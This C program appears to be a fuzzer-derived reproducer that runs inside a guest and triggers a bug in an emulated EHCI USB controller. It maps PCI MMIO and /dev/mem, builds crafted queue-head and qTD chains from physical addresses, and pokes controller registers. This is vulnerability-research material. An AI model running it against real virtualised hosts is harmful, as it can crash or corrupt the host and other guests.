#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

typedef uint64_t dma_addr_t;

// EHCI structs
typedef struct EHCIqh {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t epchar;
    uint32_t epcap;
    uint32_t current_qtd;             /* Standard next link pointer */
    uint32_t next_qtd;                /* Standard next link pointer */
    uint32_t altnext_qtd;
    uint32_t token;                   /* Same as QTD token */
    uint32_t bufptr[5];               /* Standard buffer pointer */
} EHCIqh;

typedef struct EHCIqtd {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t altnext;                 /* Standard next link pointer */
    uint32_t token;
    uint32_t bufptr[5];               /* Standard buffer pointer */
} EHCIqtd;

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce ehci-01: start\n[+]\n");

    // lspci -v
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:1d.7/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    // hcd-ehci has enabled the master bit

    EHCIqtd *qtd0_virt = (EHCIqtd *)calloc_256aligned(sizeof(EHCIqtd));
    uint64_t qtd0_phys = gva_to_gpa(qtd0_virt);
    // writel 0x10139008 0x3d5c4b84
    qtd0_virt->token = 0x3d5c4b84;
    
    EHCIqh *qh0_virt = (EHCIqh *)calloc_256aligned(sizeof(EHCIqh));
    uint64_t qh0_phys = gva_to_gpa(qh0_virt);
    EHCIqh *qh1_virt = (EHCIqh *)calloc_256aligned(sizeof(EHCIqh));
    uint64_t qh1_phys = gva_to_gpa(qh1_virt);
    EHCIqh *qh2_virt = (EHCIqh *)calloc_256aligned(sizeof(EHCIqh));
    uint64_t qh2_phys = gva_to_gpa(qh2_virt);
    EHCIqh *qh3_virt = (EHCIqh *)calloc_256aligned(sizeof(EHCIqh));
    uint64_t qh3_phys = gva_to_gpa(qh3_virt);
    EHCIqh *qh4_virt = (EHCIqh *)calloc_256aligned(sizeof(EHCIqh));
    uint64_t qh4_phys = gva_to_gpa(qh4_virt);
    // writel 0x1b2034a0 0x10100000
    qh0_virt->next = qh1_phys;
    // writel 0x10100000 0x10109000
    qh1_virt->next = qh2_phys;
    // writel 0x10109000 0x1011b000
    qh2_virt->next = qh3_phys;
    // writel 0x1011b000 0x10124000
    qh3_virt->next = qh4_phys;
    // writel 0x10124004 0x358cbd80
    // writel 0x10124014 0x10139000
    // writel 0x10124018 0x9e4bba36
    qh4_virt->epchar = 0x358cbd80;
    qh4_virt->token = 0x9e4bba36;
    qh4_virt->altnext_qtd = qtd0_phys;

    mmio_write(0x20, 0x1c4a5135);
    mmio_write(0x64, 0x5f919911);
    mmio_write(0x64, 0x5431e207);
    mmio_write(0x38, qh0_phys);
    sleep(1);

    printf("[+]\n[+] Reproduce ehci-01: fail!\n[+]\n");

    return 0;
}
